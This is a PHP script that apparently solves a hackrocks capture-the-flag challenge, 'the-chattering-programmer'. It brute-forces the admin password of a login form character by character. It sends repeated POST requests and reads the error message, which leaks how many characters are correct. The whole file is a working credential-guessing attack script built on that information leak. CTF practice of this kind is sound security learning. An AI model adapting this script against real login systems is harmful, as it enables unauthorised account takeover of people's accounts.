<?php
require 'vendor/autoload.php';

$client = new GuzzleHttp\Client(['base_uri' => 'https://challenges.hackrocks.com', 'verify' => './cacert.pem']);

$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$correct_pwd = "";
$placeholder_pwd = "........................";

$start = time();

while (strlen($correct_pwd) < 24)
{
    $current_position = strlen($correct_pwd);
    
    for ($i = 0;$i < strlen($characters); $i++)
    {
        $placeholder_pwd[$current_position] = $characters[$i];
        
        $response = $client->request('POST', '/the-chattering-programmer/login', [
            'form_params' => [
                'login' => 'admin',
                'password' => $placeholder_pwd
            ],
            'delay' => 75
        ]);
        $body = $response->getBody();

        echo "Test: " . $placeholder_pwd . " ->" . check_character_is_correct($body) . "\r\n";

        if(check_character_is_correct($body) === 1)
        {
            popen('cls', 'w');
            $correct_pwd .= $characters[$i];
            echo "Character found [" . $characters[$i] . "], current password is -> " . $correct_pwd . "\r\n";
            $placeholder_pwd = "........................";
            break;
        }
    }
}

echo "Executed in: " . (time() - $start) . "s";

function check_character_is_correct($response)
{
    return preg_match('/Password is incorrect, but it has 1 correct characters/', $response);
}
?>